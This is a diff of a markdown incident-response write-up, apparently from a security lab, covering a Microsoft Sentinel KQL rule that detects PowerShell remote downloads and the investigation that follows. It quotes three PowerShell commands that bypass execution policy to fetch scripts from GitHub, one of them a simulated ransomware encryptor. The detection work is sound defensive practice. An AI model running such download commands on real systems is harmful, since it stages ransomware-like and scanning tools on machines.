@@ -1,10 +1,16 @@
 # Overview
-Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.
 
-When processes are executed/run on the local VM, logs will be forwarded to Microsoft Defender for Endpoint under the DeviceProcessEvents table. These logs are then forwarded to the Log Analytics Workspace being used by Microsoft Sentinel, our SIEM. Within Sentinel, we will define an alert to trigger when PowerShell is used to download a remote file from the internet. 
+Sometimes when a bad actor gains access to a system, they attempt to download malicious payloads or tools directly from the internet to expand control or establish persistence. This is often done using legitimate utilities such as PowerShell to blend in with normal administrative activity. By leveraging commands like `Invoke-WebRequest`, an attacker can download scripts from an external server and immediately execute them, bypassing traditional defenses.
+
+This behavior is commonly associated with post-exploitation activity and may enable malware deployment, data exfiltration, reconnaissance, or command-and-control (C2) communication. Detecting this activity is critical to disrupting an attack early in the kill chain.
+
+When processes execute on a VM, logs are forwarded to **Microsoft Defender for Endpoint** under the `DeviceProcessEvents` table. These logs are ingested into the Log Analytics Workspace used by **Microsoft Sentinel** (SIEM). We will define an alert that triggers when PowerShell downloads a remote file from the internet.
+
+---
 
 # Alert Rule
-```
+
+```kql
 let TargetHostname = "ktran-vm";
 DeviceProcessEvents
 | where DeviceName == TargetHostname
@@ -13,48 +19,67 @@ DeviceProcessEvents
 | order by TimeGenerated
 ```
 
-#### Analytics Rule Settings:
-- Name: 
-- Description: 
-- Enable the Rule
-- Use ChatGPT to set Mitre ATT&CK Framework Categories based on the query
-- Run query every 4 hours
-- Lookup data for last 24 hours (can define in query)
-- Stop running query after alert is generated == Yes
-Configure Entity Mappings:	
-- Account |  Identifier: Name, Value: AccountName	
-- Host | Identifier: HostName, Value: DeviceName
-- Process | Identifier: CommandLine, Value: ProcessCommandLine
+## Analytics Rule Settings
 
-- Automatically create an Incident if the rule is triggered
-- Group all alerts into a single Incident per 24 hours
+- **Name:** Suspicious PowerShell Remote Download Activity  
+- **Description:** Detects PowerShell Invoke-WebRequest downloading remote content  
+- Enable the Rule  
+- MITRE ATT&CK Mapping:
+  - T1059.001 – Command and Scripting Interpreter: PowerShell  
+  - T1105 – Ingress Tool Transfer  
+- Run query every 4 hours  
+- Lookup data from last 24 hours  
 - Stop running query after alert is generated (24 hours)
 
+### Entity Mappings
+- **Account**
+  - Identifier: Name  
+  - Value: AccountName  
+- **Host**
+  - Identifier: HostName  
+  - Value: DeviceName  
+- **Process**
+  - Identifier: CommandLine  
+  - Value: ProcessCommandLine  
+
+- Automatically create an Incident  
+- Group alerts into a single Incident per 24 hours  
+
+---
+
 # Incident
-The above alert was triggered, causing the creation of an incident in Microsoft Sentinel.
+
+The alert triggered and generated an incident in Microsoft Sentinel.
 
 ![incident](/images-sus/incident.png)
 
-I assign the incident to myself and label it active.
+The incident was assigned and set to **Active**.
 
 ![incident assign](/images-sus/incident-assigned.png)
 
-Further investigation reveals 3 suspicious entities and the `ktran-vm` virtual machine.
+Investigation revealed three suspicious PowerShell command executions associated with the `ktran-vm` virtual machine.
 
 ![incident visual](/images-sus/investigate.png)
 
-The suspicious entities involved are as follows.
+## Suspicious Commands Identified
+
 - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`
 - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
 - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`
-Each entity is using Powershell's `Invoke-WebRequest` command to download a script from an external site (Github).
 
- I use the query below to see if the scripts were executed and if so how many times.
- ```
-let TargetHostname = "ktran-vm"; // Replace with the name of your VM as it shows up in the logs
-let ScriptNames = dynamic(["eicar.ps1", "portscan.ps1", "pwncrypt.ps1"]); // Add the name of the scripts that were downloaded
+Each command used `Invoke-WebRequest` to download a script from GitHub.
+
+---
+
+## Script Execution Verification
+
+To determine whether the downloaded scripts were executed:
+
+```kql
+let TargetHostname = "ktran-vm";
+let ScriptNames = dynamic(["eicar.ps1", "portscan.ps1", "pwncrypt.ps1"]);
 DeviceProcessEvents
-| where DeviceName == TargetHostname // Comment this line out for MORE results
+| where DeviceName == TargetHostname
 | where FileName == "powershell.exe"
 | where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
 | order by TimeGenerated
@@ -64,22 +89,38 @@ DeviceProcessEvents
 
 ![execution logs](/images-sus/script-logs.png)
 
-It looks like they were. And looks as though even the user executed the portscan script themself. After speaking with the individual, it seems they clicked on an external link and then their screen just went blank.
-I sign into the VM and pass the scripts off to the malware team. They come back with a description of each one:
-- portscan.ps1: Scans a specified range of IP addresses for open ports from a list of common ports and logs the results.
-- eicar.ps1: Creates an EICAR file which is used to test antivirus solutions and logs the process.
-- pwncrypt.ps1: Encrypts files in a selected user's desktop folder, simulating ransomware activity, and creates a ransom note with decryption instructions.
+Results confirmed the scripts were executed. User interview revealed the activity began after clicking an external link, after which their screen went blank.
 
-# Containment, Eradication and Recovery
-The machine was isolated in MDE and an anti-malware scan was run. After the machine came back clean, we removed it from isolation.
+The scripts were forwarded to the malware analysis team. Findings:
+
+- **portscan.ps1** – Scans IP ranges for open common ports and logs results  
+- **eicar.ps1** – Creates an EICAR test file to validate antivirus detection  
+- **pwncrypt.ps1** – Simulates ransomware by encrypting files and generating a ransom note  
+
+---
+
+# Containment, Eradication, and Recovery
+
+- The affected machine was isolated in Microsoft Defender for Endpoint  
+- A full anti-malware scan was executed  
+- No persistence mechanisms or lateral movement were detected  
+- The device was removed from isolation after validation  
+
+---
 
 # Post-Incident Activities
-Had the user go through extra rounds of cybersecurity awareness and training and upgraded our Cyber awareness training package from KnowBe4.
 
-Also started implementation of a policy that restricts the use of PowerShell for non-essential users.
+- User completed additional cybersecurity awareness training  
+- Organization upgraded training package (KnowBe4)  
+- Began implementing policy restricting PowerShell usage for non-essential users  
+- Reviewed endpoint monitoring and script execution controls  
+
+---
 
 # Closure
-I filled the activity log with a summary of my findings, labeled the incident a `True Positive` and closed it.
+
+The incident was documented and classified as a **True Positive**. No evidence of persistence, credential theft, or lateral movement was identified.
+
 ```
 Alert triggered for PowerShell Invoke-WebRequest activity on host ktran-vm, indicating remote script downloads from GitHub. Investigation confirmed three scripts (eicar.ps1, portscan.ps1, pwncrypt.ps1) were downloaded and executed using -ExecutionPolicy Bypass. User interview determined the activity began after clicking an external link. The device was isolated in MDE and a full anti-malware scan was completed with no evidence of persistence or lateral movement. Scripts were analyzed by the malware team and confirmed to simulate testing, scanning, and ransomware behavior. Preventive actions included enhanced user training and implementation of restricted PowerShell usage policies.
 ```
